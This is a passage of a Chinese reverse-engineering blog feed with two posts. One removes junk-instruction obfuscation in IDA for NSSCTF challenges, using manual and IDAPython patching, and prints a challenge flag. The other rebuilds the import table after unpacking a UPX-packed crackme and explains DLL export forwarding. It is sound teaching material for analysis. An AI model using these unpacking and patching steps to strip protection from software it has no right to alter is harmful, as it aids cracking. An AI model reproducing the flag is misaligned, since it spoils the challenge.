7Bh</span><br></pre></td></tr></table></figure><p>可以看到前两条指令使得下一条指令应该是从loc_41188C+1开始的，但是IDA已经从41188C开始分析了，因此我们要将41818C的字节给nop掉。</p><p>由于作者的IDA没有keypatch插件，因此作者在此介绍通过修改16进制窗口的字节码来实现patch的方法，如果读者有patch插件，可以进行patch。</p><ul><li>首先在41188C处按下D键，将其转化为字节码。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00411888                 jz      short near ptr unk_41188D</span><br><span class="line">.text:0041188A                 jnz     short near ptr unk_41188D</span><br><span class="line">.text:0041188A ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0041188C                 db 0E8h</span><br><span class="line">.text:0041188D unk_41188D      db 0A1h                 ; CODE XREF: .text:00411888↑j</span><br><span class="line">.text:0041188D                                         ; .text:0041188A↑j</span><br><span class="line">.text:0041188E                 db  30h ; 0 OFF32 SEGDEF [_rdata,417B30]</span><br><span class="line">.text:0041188F                 db  7Bh ; &#123;</span><br><span class="line">.text:00411890                 db  41h ; A</span><br><span class="line">.text:00411891 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00411891                 add     [ecx+0D8BE045h], cl</span><br><span class="line">.text:00411897                 xor     al, 7Bh</span><br></pre></td></tr></table></figure></li><li>在16进制窗口中右键Edit,将E8修改为90，回到反汇编窗口。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00411888                 jz      short near ptr unk_41188D</span><br><span class="line">.text:0041188A                 jnz     short near ptr unk_41188D</span><br><span class="line">.text:0041188A ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0041188C                 db 90h</span><br><span class="line">.text:0041188D unk_41188D      db 0A1h                 ; CODE XREF: .text:00411888↑j</span><br><span class="line">.text:0041188D                                         ; .text:0041188A↑j</span><br><span class="line">.text:0041188E                 db  30h ; 0 OFF32 SEGDEF [_rdata,417B30]</span><br><span class="line">.text:0041188F                 db  7Bh ; &#123;</span><br><span class="line">.text:00411890                 db  41h ; A</span><br><span class="line">.text:00411891 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00411891                 add     [ecx+0D8BE045h], cl</span><br><span class="line">.text:00411897                 xor     al, 7Bh</span><br></pre></td></tr></table></figure></li><li>在4118C处按下C键，然后依次在之后的代码也按下C键，知道左边的地址栏中没有黄色的地址为止。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00411888                 jz      short loc_41188D</span><br><span class="line">.text:0041188A                 jnz     short loc_41188D</span><br><span class="line">.text:0041188C                 nop</span><br><span class="line">.text:0041188D</span><br><span class="line">.text:0041188D loc_41188D:                             ; CODE XREF: .text:00411888↑j</span><br><span class="line">.text:0041188D                                         ; .text:0041188A↑j</span><br><span class="line">.text:0041188D                 mov     eax, ds:dword_417B30</span><br><span class="line">.text:00411892                 mov     [ebp-20h], eax</span><br><span class="line">.text:00411895                 mov     ecx, ds:dword_417B34</span><br><span class="line">.text:0041189B                 mov     [ebp-1Ch], ecx</span><br><span class="line">.text:0041189E                 mov     edx, ds:dword_417B38</span><br><span class="line">.text:004118A4                 mov     [ebp-18h], edx</span><br><span class="line">.text:004118A7                 mov     eax, ds:dword_417B3C</span><br><span class="line">.text:004118AC                 mov     [ebp-14h], eax</span><br><span class="line">.text:004118AF                 mov     ecx, ds:dword_417B40</span><br><span class="line">.text:004118B5                 mov     [ebp-10h], ecx</span><br><span class="line">.text:004118B8                 mov     dx, ds:word_417B44</span><br><span class="line">.text:004118BF                 mov     [ebp-0Ch], dx</span><br><span class="line">.text:004118C3                 mov     dword ptr [ebp-2Ch], 0</span><br><span class="line">.text:004118CA                 jmp     short loc_4118D5</span><br></pre></td></tr></table></figure><ul><li>最后在函数头位置按下P键，重新定义函数。如此，花指令已经被手动修改成功了，再按下F5按键，即可得到真正的主函数伪代码。</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">28</span>]; <span class="comment">// [esp+DCh] [ebp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(v5, <span class="string">&quot;NSSCTF&#123;Jump_b9_jump!&#125;&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">21</span>; ++i )</span><br><span class="line">    v5[i] = (v5[i] + v5[(i * i + <span class="number">123</span>) % <span class="number">21</span>]) % <span class="number">128</span>;</span><br><span class="line">  <span class="built_in">sub_4110CD</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>)v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用IDApython进行花指令的patch"><a href="#使用IDApython进行花指令的patch" class="headerlink" title="使用IDApython进行花指令的patch"></a>使用IDApython进行花指令的patch</h2><p>本部分的例题是NSSCTF平台上的wordy。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000001135 ; int __fastcall main(int, char **, char **)</span><br><span class="line">.text:0000000000001135 main:                                   ; DATA XREF: start+1D↑o</span><br><span class="line">.text:0000000000001135 ; __unwind &#123;</span><br><span class="line">.text:0000000000001135                 push    rbp</span><br><span class="line">.text:0000000000001136                 mov     rbp, rsp</span><br><span class="line">.text:0000000000001139                 sub     rsp, 10h</span><br><span class="line">.text:000000000000113D                 mov     dword ptr [rbp-4], 0</span><br><span class="line">.text:0000000000001144</span><br><span class="line">.text:0000000000001144 loc_1144:                               ; CODE XREF: .text:loc_1144↑j</span><br><span class="line">.text:0000000000001144                 jmp     short near ptr loc_1144+1</span><br><span class="line">.text:0000000000001144 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000001146                 dw 0BFC0h</span><br><span class="line">.text:0000000000001148                 dq 0FFFEDFE800000068h, 65BFC0FFEBFFh, 0FFEBFFFFFED2E800h</span><br><span class="line">.text:0000000000001148                 dq 0C5E80000006CBFC0h, 6CBFC0FFEBFFFFFEh, 0FFFFFEB8E8000000h</span><br><span class="line">.text:0000000000001148                 dq 6FBFC0FFEBh, 0C0FFEBFFFFFEABE8h, 0FE9EE800000020BFh</span><br><span class="line">.text:0000000000001148                 dq 77BFC0FFEBFFFFh, 0EBFFFFFE91E80000h, 0E80000006FBFC0FFh</span><br><span class="line">.text:0000000000001148                 dq 0BFC0FFEBFFFFFE84h, 0FFFE77E800000072h, 6CBFC0FFEBFFh</span><br><span class="line">.text:0000000000001148                 dq 0FFEBFFFFFE6AE800h, 5DE800000064BFC0h, 21BFC0FFEBFFFFFEh</span><br><span class="line">.text:0000000000001148                 dq 0FFFFFE50E8000000h, 0ABFC0FFEBh, 0C0FFEBFFFFFE43E8h</span><br><span class="line">.text:0000000000001148                 dq 0FE36E800000054BFh, 68BFC0FFEBFFFFh, 0EBFFFFFE29E80000h</span><br><span class="line">.text:0000000000001148                 dq 0E800000065BFC0FFh, 0BFC0FFEBFFFFFE1Ch, 0FFFE0FE800000072h</span><br><span class="line">.text:0000000000001148                 dq 65BFC0FFEBFFh, 0FFEBFFFFFE02E800h, 0F5E800000020BFC0h</span><br><span class="line">.text:0000000000001148                 dq 61BFC0FFEBFFFFFDh, 0FFFFFDE8E8000000h, 72BFC0FFEBh</span><br><span class="line">.text:0000000000001148                 dq 0C0FFEBFFFFFDDBE8h, 0FDCEE800000065BFh, 20BFC0FFEBFFFFh</span><br><span class="line">.text:0000000000001148                 dq 0EBFFFFFDC1E80000h, 0E80000006DBFC0FFh, 0BFC0FFEBFFFFFDB4h</span><br></pre></td></tr></table></figure><p>可以看到从jmp命令开始，IDA已经无法自动分析了。<br>可以看到，这里的JMP指令与前文中调到的E8 FF的call指令有相似之处。<br>因此我们只需要将EB改成90即可。<br>但是之后的汇编中同样有相同的花指令，而且非常多，我们可以使用IDApython来对其进行修改。</p><p>附上代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">startaddr = <span class="number">0x001144</span></span><br><span class="line">endaddr = <span class="number">0x3100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(startaddr,endaddr):</span><br><span class="line">    <span class="keyword">if</span> get_wide_byte(i) == <span class="number">0xEB</span>:</span><br><span class="line">        <span class="keyword">if</span> get_wide_byte(i+<span class="number">1</span>) == <span class="number">0xFF</span>:</span><br><span class="line">            patch_byte(i,<span class="number">0x90</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Addr &#123;&#125; is patched&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(i)))</span><br></pre></td></tr></table></figure><p>关键的就是两个函数，一个是get_wide_byte()函数,一个是patch_byte()函数。</p><p>当然IDA编写脚本时有很多函数。</p><blockquote><p><a href="http://www.s0rry.cn/archives/python-ni-xiang-jiao-ben-bian-xie">http://www.s0rry.cn/archives/python-ni-xiang-jiao-ben-bian-xie</a></p></blockquote><p>可以参考上面这个链接进行学习。</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 混淆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对exe文件脱壳之后的重建输入表以及函数的转发</title>
      <link href="/2023/02/28/2023-02-28-%E9%87%8D%E5%BB%BA%E8%BE%93%E5%85%A5%E8%A1%A8/"/>
      <url>/2023/02/28/2023-02-28-%E9%87%8D%E5%BB%BA%E8%BE%93%E5%85%A5%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="对exe文件脱壳之后的重建输入表以及函数的转发"><a href="#对exe文件脱壳之后的重建输入表以及函数的转发" class="headerlink" title="对exe文件脱壳之后的重建输入表以及函数的转发"></a>对exe文件脱壳之后的重建输入表以及函数的转发</h1><p><em>作者：tgrddf55</em></p><h2 id="一-问题引入"><a href="#一-问题引入" class="headerlink" title="一.问题引入"></a>一.问题引入</h2><p>在b站视频（BV1LL4y1n7Af）crackme 第十个视频ceycey中，笔者按照视频所演示的进行脱壳，却发现dump之后的exe文件无法打开，在师傅的指引下，知晓了这可能是本机的windows系统版本太高的问题，并且这个问题可以通过<strong>重建输入表</strong>来解决，于是笔者开始了重建输入表的学习。</p><hr><p>本篇内容包括PE文件中的输入表结构、壳的功能及简单原理、何为dump，<br>如何重建输入表、函数的转发。</p><p>如果读者遇到了在64位系统中脱32位程序的upx壳失败的问题，并且上述知识没有任何储备的话，建议从头认真阅读本文章。</p><p>本文章是笔者边学边写，因此可能存在部分问题，望读者指正。</p><hr><h2 id="二-为什么要重建输入表"><a href="#二-为什么要重建输入表" class="headerlink" title="二.为什么要重建输入表"></a>二.为什么要重建输入表</h2><p><del>由于这个问题涉及到较多的前置知识，本篇文章致力于让没有学习这些知识的同学也能理解内容，但笔者能力有限，如果想对该篇内容进行更深刻的理解的话，建议学习PE文件结构</del></p><h3 id="（1）输入表结构"><a href="#（1）输入表结构" class="headerlink" title="（1）输入表结构"></a>（1）输入表结构</h3><p>exe文件即为PE文件中的一种，这个文件中存有许多结构，类似于一座房子，有窗户，有门……其中输入表就是其中的一种结构。</p><p>输入表的作用就是引用外部的函数，比如C++中我们可以引用<code>sqrt（）</code>函数用来求根号，而<code>sqrt()</code>函数就是存放在<code>cmath</code>头文件中。输入表就是存放程序所引用的外部函数的信息的。外界函数肯定是好多个函数存放在某一个文件中的，这个文件的后缀是.dll，因此输入表中的信息是包含好多个.dll和它所存放的函数的。</p><p>接下来我们来看一张图，这张图展示了PE文件中的输入表结构。</p><p><img src="/../imgs/202303102111890.png" alt="输入表"></p><p>图片左边的那一列是输入表最外层的结构，，我们应该注意的是，一个dll文件就对应一个这样的结构，因此文件中实际存在的是很多个这样的结构。我们重点关注其中第1、4、5个元素，我们将其简称为<strong>OFT</strong> 、 <strong>name</strong>  、<strong>FT</strong></p><p>其中<strong>name</strong>这个元素指向的.dll文件的名字，也就是说，这一个结构所包含的信息是关于这一个.dll文件的。这张图中就是“Kernel32.dll”。</p><p>文件未载入内存时，也就是文件在磁盘中存放时,<strong>OFT</strong>和<strong>FT</strong>分别指向了一组关于dll文件包含函数的信息，通过这些信息就可以找到程序所要引用的函数，这两组信息我们分别称为 <em><strong>INT</strong></em> 和 <em><strong>IAT</strong></em>，如图所示。</p><p>这两张表的数据会因为程序载入内存而改变。接下来我们介绍一下在程序载入内存时这两张表的信息是如何改变的。</p><p>在此之前我们需要知道的是，程序载入内存时，因为程序需要调用外部来自dll的函数，所以dll文件就会在程序分配的地址中展开，这时候dll文件中的函数就会存在一个地址，程序里面只要引用这个地址就可以调用这个函数了。这类似于我们自己在程序中写了一个函数，函数就会在程序中存在一个地址，调用这个函数的时候只需要引用这个地址就可以，dll文件只是帮我们把函数提前写好，dll在程序被分配的地址中展开就相当于dll文件在程序中写入这个函数。这告诉我们我们要想快速的引用这个函数，只需要引用这个地址就可以了。</p><p>当程序被载入内存时，windows会首先读取 <strong>OFT</strong>的信息，然后找到 <strong>INT</strong>，通过<strong>INT</strong>找到函数的名字，然后通过这个名字索引到这个函数，这时已经得到了这个函数的地址，接下来将这个真实地址填入<strong>IAT</strong>表中对应的位置，比如函数1的真实地址是 7715A8,那么<strong>IAT</strong>表中第一个元素就会被填入7715A8，接下来，程序要调用函数1的时候只需要引用在<strong>IAT</strong>表中第一个元素的值，也就是7715A8就可以了。</p><p><img src="/../imgs/202303102111949.png" alt="输入表"></p><p>也就是说，<strong>INT</strong>表只有在最开始被windows使用来找到函数的具体位置，之后<strong>INT</strong>就没有作用了，只需要用<strong>IAT</strong>就可以了，但是需要注意的是，<strong>INT</strong>的信息仍会被保留，而不会被清除。</p><h3 id="（2）壳的功能及原理"><a href="#（2）壳的功能及原理" class="headerlink" title="（2）壳的功能及原理"></a>（2）壳的功能及原理</h3><p> 壳主要分为两大类：压缩壳和加密壳。由于笔者遇到的upx壳为压缩壳，在此主要讲解压缩壳。</p><p>我们首先假设一个exe程序的步骤是这样的 1-&gt;2-&gt;3-&gt;4-&gt;5</p><p>加了壳之后，其实是将其中的某些代码压缩了，同时在程序头加上壳的代码用来解压缩。那么加上壳之后的程序就是这样：</p><p>11(壳的代码)-&gt; 1.2 -&gt; 2.2 -&gt; 3.2 -&gt; 4-&gt; 5 </p><p>程序加载到内存时，首先11（壳的代码）运行 ，运行之后 1.2就解压缩成了1，2.2就解压缩成了2, 3.2就解压缩成了3，11（壳的代码）运行完后，这三个部分也就解压缩完成，这时，程序也就运行到了1，之后就和没有加壳的程序一样了。</p><p> 上面的知识告诉我们，要想脱壳，我们只需要运行完11（壳的代码）找到1的入口点就可以了，我们将1的入口点称之为OEP（程序的原始入口点 Original Enter Point）。</p><p> 这其实也告诉我们，要想找到OEP，一定需要运行完壳的代码，否则，即使你事先知道OEP的地址，但没有运行壳代码，直接跳转到这一个地址也是失败的。（静态分析）</p><h3 id="（3）dump"><a href="#（3）dump" class="headerlink" title="（3）dump"></a>（3）dump</h3><p>接下来，我们再了解一个概念 <em><strong>dump</strong></em> 。我们通过前面的知识可以知道，一个程序在磁盘中和程序在内存中的情况是不同的，至少它的<strong>IAT</strong>信息是不同的，那么我们为了研究程序在内存中的情况，就很自然地想到希望一个东西能够将内存中程序的情况复刻出来，将其保存在磁盘中。<em><strong>dump</strong></em>就是指的这个过程，通过 <em><strong>dump</strong></em>我们可以得到程序在内存中的信息。在脱壳过程中，当我们已经找到了OEP（程序的原始入口点 Original Enter Point），我们就希望能够将这个状态保存下来，这时也需  <em><strong>dump</strong></em> 这个过程，OD中就可以实现这个功能。</p><p>一个正常的没有加过壳的程序，将其在OD中 <em><strong>dump</strong></em> 出来，通过上面的知识我们可以推断出，这个被 <em><strong>dump</strong></em> 出来的程序应该仍然可以运行。虽然它的 <strong>IAT</strong>表中被更改了，但是windows仍然可以通过<strong>INT</strong>得到函数名进而使得程序正常运行。</p><p>但是加过壳的程序，它的<strong>INT</strong>和<strong>IAT</strong>都可能存在问题，因此如果我们在OEP处直接 <em><strong>dump</strong></em>，这样出来的程序可能是无法运行的。</p><p>在此笔者做了大量的实验，验证了 <strong>INT</strong> 和<strong>IAT</strong>不同情况下程序的运行情况。<br>未加壳的程序，当它OFT错误（全为零），也即通过<strong>INT</strong>这条路径索引到函数名失败,<strong>IAT</strong>正确（指向函数名，而不是函数的真实地址）时，函数能够正常运行。笔者推测可能是由于windows通过<strong>IAT</strong>表来找到函数名，进而找到函数的真正地址，再填充<strong>IAT</strong>表相应位置，从而使得函数正常运行。(见下3图)</p><p>(应当注意的是，这里的RVA并非在文件中的偏移地址，但是可以通过一定的公式进行换算，Stud_PE中存在换算器)</p><p>(在此解释一下下面三张图的含义，第一张图即为通过工具找到的kernel32.dll的输入表信息，可以看到OFT为零，也就是说这里无法通过OFT找到<strong>INT</strong>，但是 FT 所指向的<strong>IAT</strong>信息是正确的)</p><p>(第二张图通过FT中的309C换算成E6C，再找到E6C这个位置，这个位置显示的是函数名的地址)</p><p>(第三张图也即通过上图找的地址索引到函数名 GetMoudleHandleA )<br><img src="/../imgs/202303102111498.webp" alt="yiat"></p><p><img src="/../imgs/202303102111131.webp" alt="yiat"></p><p><img src="/../imgs/202303102111909.webp" alt="yiat"></p><p>(可以将上面三图比照最上面第一张图输入表结构来看，进而更好地理解输入表结构)</p><p>未加壳的程序，当它的OFT错误（全为零），<strong>IAT</strong>不正确（存放函数的真正地址）时，函数不能正常运行。我都有函数的正确地址了，为什么函数还不能正常运行呢？因为windows是通过函数名来找到函数的真正地址，这一个步骤是windows能够正确识别函数的关键步骤，然而当我们的<strong>INT</strong>错误，windows仍然会进行上一段的步骤，然而正确的<strong>IAT</strong>存放的是函数名的地址，windows会通过<strong>IAT</strong>中的地址索引到函数名，现在windows根据<strong>IAT</strong>索引是找不到函数名的（因为<strong>IAT</strong>存放的是在内存中函数的真正地址，而不是函数名的地址）</p><p>（见下2图）</p><p>(第一二张图所展示的步骤和正常程序所演示的步骤相同，但注意到这里的IAT表所填入的是函数的真实地址7636DAF3（小端序存储，也即逆序存储）)</p><p>(此二图同样可以比照输入表在内存中的结构来看)</p><p><img src="/../imgs/202303102111261.webp" alt="yiat"></p><p><img src="/../imgs/202303102111618.webp" alt="yiat"></p><p>接下来我们来看一下upx壳会对程序的输入表进行何种的改变。</p><p>(第一张图为没有加壳的程序输入表)<br>(第二章图为加壳之后的程序输入表)</p><p><img src="/../imgs/202303102111683.webp" alt="yiat"></p><p><img src="/../imgs/202303102111849.webp" alt="yiat"></p><p>可以看到加壳之后，程序的函数数量不仅发生了改变( 10-&gt;5 ),输入表中的 <strong>OFT</strong>信息也改变了，这样 <em><strong>dump</strong></em> 出来的程序中，<strong>INT</strong> &#x2F;<strong>IAT</strong>也存在问题，函数数量也存在问题，如果不重建输入表的话(在OD中没有勾选重建输入表)，程序一定是无法运行的。（之后会对这个问题进行分析）</p><h2 id="二、重建输入表的原理"><a href="#二、重建输入表的原理" class="headerlink" title="二、重建输入表的原理"></a>二、重建输入表的原理</h2><p>加壳之后，会发现这时候输入表和原来的程序输入表大不相同，甚至函数数量也不一样，按照道理来说函数数量减少了那么程序就肯定运行不起来了，为什么还能运行？</p><p>其实这时候的输入表不是真正的输入表，而应该是壳自己的输入表，通过以上学习我们可以知道，程序在内存中只需要有所有函数的真正地址就可以了，壳的代码在运行完后，肯定会将函数的真正地址展现出来，并不影响程序的运行。但是程序在OEP处 <em><strong>dump</strong></em> 出来（如果没有重建输入表）后输入表仍然是壳的输入表，并不是真正的 <strong>IAT</strong>(存放函数真正地址的表)，因此这样的程序在不重建输入表是无法运行的。</p><p>但是 找到程序的OEP时，所有函数的真正地址应该都已经出现了，存放函数地址的是 <strong>IAT</strong>，我们可以通过找到这个 <strong>IAT</strong>，进而还原真个输入表的结构。通过这个原理，我们已经可以手动修复输入表了，也就是利用十六进制编辑器将函数的名字、<strong>OFT</strong>、<strong>FT</strong>重新写入就可以了。</p><p>接下来我们讲解一下如何利用OD找到真正的 <strong>IAT</strong>（存放函数真正地址）。</p><p>OD中在找到OEP后，以下的代码就是原程序了，找到任意一个调用API函数的语句，然后找到在哪个地址存放了函数的地址就可以了。这些地址就是<strong>IAT</strong>。（如图）</p><p><img src="/../imgs/202303102112092.webp" alt="yiat"></p><p>（表中标出来的77开头的和75开头的地址就是函数的真正地址）（注意小端序存储）</p><h2 id="三、如何重建输入表"><a href="#三、如何重建输入表" class="headerlink" title="三、如何重建输入表"></a>三、如何重建输入表</h2><p>其实OD中就存在重建输入表这个选项，但是OD不太智能，有些时候重建输入表之后仍然有问题。</p><p>其实对于upx壳来说，OD重建输入表已经完全可以了，但是笔者在64位系统中重建的32位程序，这样导致重建的输入表仍然出现问题，因此如果是upx等简单壳，不想学习较为复杂的重建输入表步骤的话，可以选择将其拖入win7 32位虚拟机中运行，笔者也对这一步进行了操作。</p><p><del>接下来我们开始讲解一下，使用importREC重建输入表。</del></p><p><del>(其实完全可以使用16进制的编辑器手动重建输入表，但是笔者懒)</del></p><p>由于笔者在群中已经发布过视频，建议跟着视频来进行学习使用ImportREC重建输入表。</p><p>视频为本文件同目录下的“ceycey 脱壳 重建输入表.mkv”</p><p>这里应该注意的是，笔者在视频中的演示存在一定的问题，在填写 <strong>IAT</strong> 地址信息的时候，笔者并没有学习到这一方面的知识，实际填写的是错误的，但是importREC可能比较智能，总之笔者误打误撞地完成了。在此笔者重新录制一个视频。读者可以选择只看这一个视频。</p><p>视频为本文件同目录下的“importrec.mkv”</p><h2 id="四、函数的转发"><a href="#四、函数的转发" class="headerlink" title="四、函数的转发"></a>四、函数的转发</h2><p>接下来将解释一下笔者遇到的根本问题。</p><p>在64位程序中脱32位程序，使用OD重建输入表，此时OD会将某些函数识别错误。（见图）</p><p><img src="/../imgs/202303102112644.webp" alt="yiat"></p><p>图中标出来的函数是来自ntdll.dll，但是这个库却是user32.dll，那么这个程序肯定就无法运行了。</p><p>我们看一下正确的情况是怎么样的。</p><p><img src="/../imgs/202303102112235.webp" alt="yiat"></p><p>正确的函数是DefWindowProcA,错误的函数却是NtdllDefWindowProcA。<br>我们很容易就可以想到这两个函数肯定存在某种关系。<br>实际上确实这两个函数存在关系，这里涉及到函数的转发。</p><p>dll文件中存在很多函数，而dll文件之间也可以引用，或者说是转发。<br>在32位系统的user32.dll中，DefWindowProcA函数是不存在转发的，也就是正常的。但是64位的user32.dll有一些不同。我们知道dll文件中存储的是真正的函数，可是，现在user32.dll（64 位)中是没有DefWindowProcA真正函数的,只有DefWindowProcA这个名字，它将这个真正函数给了ntdll.dll,在ntdll.dll中这个函数叫做NtdllDefWindowProcA，也就是我们上两张图看到的。<br>其中这个NtdllDefWindowProcA就叫做DefWindowProcA的转发函数。</p><p>接下来我们讲解一下dll文件导出表的结构。</p><p><img src="/../imgs/202303102112704.png" alt="yiat"></p><p>有三个表，一个存储函数的名字，一个存储函数的地址，一个索引表用来连接这两个表。dll文件在我们的程序中展开之后，windows通过程序的导入表找到所要使用函数的名字，然后拿着这个名字在展开后的dll中找，没错，就是在导出名称表中找。找到之后根据对应的索引表再找到函数的地址，然后再利用这个地址填充程序的<strong>IAT</strong>。这样就将我们之前学到的导入表的知识关联起来了。</p><p>但是现在user32.dll(64)中DefWindowProcA对应的导出地址表中存放的不是这个函数的地址(因为在user32.dll不存在这个函数了，也就没有这个地址了，只是还残留着这个函数的名字），存放的其实是其导出函数的名字的地址，我们通过这个地址找到的其实是NtdllDefWindowProcA这个字符串。<br><img src="/../imgs/202303102112294.webp" alt="yiat"></p><p><img src="/../imgs/202303102112674.webp" alt="yiat"></p><p>(从图一找到图二时同样存在文件偏移地址和RVA的转换，在此只是演示一下上一段所讲解的内容)</p><p>windows在程序中载入user32.dll后，知道其导出函数有转发函数了，然后就会展开ntdll.dll，然后将NtdllDefWindowProcA的地址给填入到user32.dll中的DefWindowProcA函数的地址，也就是原本存放NtdllDefWindowProcA字符串地址的位置。这样user32.dll中的导出地址表就都是函数的真正地址了，尽管有些函数是通过导出函数来找到这个地址的。最后windows就会将user32.dll的导出地址表挨着填入<strong>IAT</strong>。<br>(见下图)<br><img src="/../imgs/202303102112365.png" alt="1"></p><p>这样其实就已经解释了笔者遇到的问题了。</p><p>在64位系统中，OD（即使是importREC)是根据<strong>IAT</strong>表中函数的真正地址来找到这个函数名，进而重建整个导入表的，现在DefWindowProcA的真正地址填入的却是NtdllDefWindowProcA的地址，当然重建之后还是NtdllDefWindowProcA这个函数。</p><p>而32位系统中DefWindowProcA并没有转发，user32.dll中存在着这个函数，自然使用OD重建输入表是正确的。</p><p><del>以上关于函数转发的内容主要来源于下面这个链接</del></p><blockquote><p><a href="https://www.cnblogs.com/revercc/p/16703647.html">https://www.cnblogs.com/revercc/p/16703647.html</a></p></blockquote><p>学到这里，我们就会发现，在第三部分中笔者进行的重建输入表是存在问题的。我们只是将无效的函数剪掉，也就是把原本应该存在的函数给扔掉了，刚好这个程序好像没有调用到这个函数，所以我们剪掉这个函数之后程序仍然能够运行。但是如果这个函数比较重要的话，笔者重建输入表之后就仍然不会正常运行。正确的做法就是在importREC中，不是剪掉这个函数，而是更改函数名，将ntdll前缀去掉，这样才是正确的做法(笔者的importREC似乎没有这个功能，我看网络上有这个功能的版本是v2.0.5)。</p><p>本篇内容到这里就结束了，感谢您的阅读！</p><p>如存在问题，恳请指正！</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
